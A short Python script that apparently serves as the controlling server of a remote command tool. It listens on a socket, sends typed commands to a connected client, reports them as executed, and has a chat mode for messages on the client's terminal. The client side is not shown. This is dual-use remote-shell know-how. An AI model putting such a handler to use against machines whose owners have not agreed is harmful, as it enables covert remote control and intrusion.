import socket

HOST = '192.168.1.5'
PORT = 9090

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))

server.listen()
print('Server is waiting for a connection...')

client, address = server.accept()
print(f'Connected to {address}')

mode = 'default'

while True:
    if mode == 'default':
        command = input("Enter a command: ")
    elif mode == 'chat':
        command = input('Send message to client: ')

    client.send(command.encode('utf-8'))

    try:
        package = client.recv(4096).decode('utf-8').split('#')
        print(f"[Debug] Received package: {package}")  # Debug print

        executed_command = package[0]
        client_mode = package[1]
        mode = client_mode

        print(f'mode: {client_mode}')

        if mode == 'default':
            print(f'The command "{executed_command}" was executed successfully.')
        elif mode == 'chat' and not executed_command == 'chat off':
            print(f'Message sent to client terminal.')

        if len(package) == 3:
            message = package[2]
            print(f'[Info]: {message}')

    except Exception as e:
        print(f"[Error receiving response]: {e}")
